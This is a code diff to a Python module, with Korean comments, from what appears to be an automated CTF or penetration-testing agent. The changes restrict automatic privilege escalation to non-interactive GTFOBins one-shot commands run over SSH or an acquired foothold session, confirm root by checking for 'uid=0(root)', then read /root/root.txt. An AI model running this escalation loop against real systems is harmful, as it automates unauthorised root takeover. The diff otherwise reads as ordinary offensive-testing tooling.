@@ -148,16 +148,19 @@ class FootholdMixin:
                                              "cat /root/root.txt 2>/dev/null"), phase="privesc")
                     break
             # ③-b GTFOBins 벡터 폐루프 — 위 자격 재사용으로 root 를 못 얻었을 때만.
+            # ⚠️ SSH 는 비대화형(sshpass ssh "<cmd>") 채널이므로 '대화형 .plan'(sudo -i, find -exec
+            # /bin/sh \; 등)을 쏘면 셸이 EOF 로 즉시 죽고 뒤의 id 가 원 유저로 돌아 상승을 확인 못
+            # 한다. 반드시 '비대화형 one-shot'(v.oneshot)으로 실행한다(_privesc_loop 과 동일 규칙).
             if not self.world.has_access("root"):
                 corpus = "\n".join(f.output for f in report.enum_findings if f.output)
-                vectors = [v for v in analyze_enum(corpus) if v.confidence == "high" and v.plan]
+                vectors = [v for v in analyze_enum(corpus)
+                           if v.confidence == "high" and v.oneshot("id")]
                 user, pw = creds[0]
                 sh = SSHTargetShell(target, user, pw)
                 for v in vectors[:3]:
-                    # v.plan 을 실행한 뒤 'id' 로 결과 확인 (한 줄로 묶어 실행)
                     before = len(report.enum_findings)
                     self._attempt(report, report.enum_findings,
-                                  sh.command(f"{v.plan.splitlines()[0]}; id"), phase="privesc")
+                                  sh.command(v.oneshot("id")), phase="privesc")
                     # 이 명령의 '원본' finding 으로 확인한다 — 출력구동 교정이 발화하면 뒤에 교정본이
                     # append 돼 [-1] 이 교정본을 가리킬 수 있다(감사 LOW-3). 게이트 거부면 추가 없음.
                     if len(report.enum_findings) <= before:
@@ -165,8 +168,10 @@ class FootholdMixin:
                     last = report.enum_findings[before].output or ""
                     if "uid=0(root)" in last:
                         self.world.raise_access("root")
+                        root_read = v.oneshot("cat /root/root.txt 2>/dev/null") \
+                            or "cat /root/root.txt 2>/dev/null"
                         self._attempt(report, report.enum_findings,
-                                      sh.command("cat /root/root.txt 2>/dev/null"), phase="privesc")
+                                      sh.command(root_read), phase="privesc")
                         break
 
     def _foothold_stage(self, report, host) -> None:
@@ -196,7 +201,8 @@ class FootholdMixin:
             # 권한상승 폐루프(발판 세션 위) — SSH 전용이던 폐루프를 '획득한 발판 세션'에도 적용해
             # 일반화(웹/리버스셸 발판 포함). 열거→랭킹→HIGH 벡터 실행→uid=0→root.txt.
             self._privesc_loop(session, report)
-        except OSError as e:   # 세션 소켓/전송 오류 → 발판 중단(이후 준비 스테이지는 계속)
+        except (OSError, RuntimeError) as e:   # 세션 소켓/전송 오류·닫힌 세션 → 발판 중단(이후 준비
+            # 스테이지는 계속 — RuntimeError 는 WebRce/ReverseShell 세션이 CLOSED 일 때 run()이 던진다).
             self.audit.event("foothold_session_error", error=f"{type(e).__name__}: {e}")
 
     def _privesc_loop(self, session, report) -> None:
@@ -259,16 +265,17 @@ class FootholdMixin:
                                                     "exploit-derived", "sudo -S 로 root.txt 직독")
                         self._record_flag(report, FlagHit(hit.value, hit.kind, "privesc"), prov)
                     return
-            # ② 랭킹(HIGH 벡터만)
+            # ② 랭킹 — HIGH + '비대화형 one-shot 이 있는' 벡터만 자동 발사 대상으로 삼는다.
+            # one-shot 이 없는 대화형 전용 벡터(less·nano·vi 등)는 프레이밍 채널에서 상승이 불가할
+            # 뿐 아니라 tty 대기로 '블록'될 수 있어 자동 루프에서 제외한다(제안에는 그대로 남는다).
             corpus = "\n".join(f.output for f in report.enum_findings if f.output)
-            vectors = [v for v in analyze_enum(corpus) if v.confidence == "high"]
-            # ③ HIGH 벡터 실행 — 비대화형(one-shot) 우선(프레이밍 채널에서 대화형 셸 스폰 회피)
+            vectors = [v for v in analyze_enum(corpus)
+                       if v.confidence == "high" and v.oneshot("id")]
+            # ③ HIGH 벡터 실행 (비대화형 one-shot)
             for v in vectors[:3]:
                 if self._goal_reached(report) or self._time_up():
                     return
-                probe = v.oneshot("id") or ((v.plan.splitlines()[0] + "; id") if v.plan else "")
-                if not probe:
-                    continue
+                probe = v.oneshot("id")
                 out = session.run(probe)
                 report.enum_findings.append(
                     EnumFinding(command=f"[발판 privesc 시도] {v.kind}:{v.binary}",
@@ -296,7 +303,8 @@ class FootholdMixin:
                                                         f"{v.kind} 권한으로 root.txt 직독")
                             self._record_flag(report, FlagHit(hit.value, hit.kind, "privesc"), prov)
                     return
-        except OSError as e:   # 세션 소켓/전송 오류 → privesc 중단(발판·user 플래그 유지)
+        except (OSError, RuntimeError) as e:   # 세션 소켓/전송 오류·닫힌 세션 → privesc 중단
+            # (발판·user 플래그 유지; RuntimeError 는 세션 CLOSED 시 run()이 던진다).
             self.audit.event("privesc_session_error", error=f"{type(e).__name__}: {e}")
 
     def _acquire_session(self, report, host):
